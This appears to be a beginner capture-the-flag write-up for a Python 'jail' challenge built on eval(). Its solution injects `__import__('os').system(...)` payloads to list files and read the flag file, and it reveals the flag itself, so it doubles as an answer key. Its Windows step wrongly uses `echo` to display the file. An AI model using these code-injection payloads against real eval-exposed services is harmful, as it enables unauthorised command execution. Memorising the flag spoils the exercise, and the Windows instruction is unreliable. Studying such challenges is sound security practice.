# PyJail-Intro 1

### Difficulty: Beginner
### Objective: `eval()`

## Setting Up
Install both the `pyjail.py` and `flag-afd3ca89be90859c70e89a903f09f9fb.txt` files into the same directory. Then, just execute the python script to start the challenge. 

![image](https://github.com/user-attachments/assets/cf04ccba-8bc8-4779-9045-b283c7dd7651)



## Solution

<details>

### Step 1
We can use the `__import__` and then called the `os` modules to use one of its functions which is `listdir` or `system`. Both have similar functions to list down the files in the working directories.

`__import__('os').listdir('.')`

![image](https://github.com/user-attachments/assets/e56d22e8-6b1e-4b6e-b7e1-2dd5d82f5723)

OR

> Linux OS:
`__import__('os').system('ls')`

> Windows OS:
`__import__('os').system('dir')`

### Step 2
Now we know that there's a file called `flag-afd3ca89be90859c70e89a903f09f9fb.txt` so we can just display the content by using `cat` or `echo` depends on the OS you're using.

>Linux OS:
`__import__('os').system('cat flag-afd3ca89be90859c70e89a903f09f9fb.txt')`

>Windows OS:
`__import__('os').system('echo flag-afd3ca89be90859c70e89a903f09f9fb.txt')`

![image](https://github.com/user-attachments/assets/e87d58ab-30ce-4629-9e00-7103aba4c632)

### Flag 
>flag{93da9b115c23778dafd95da03f642d48}

</details>
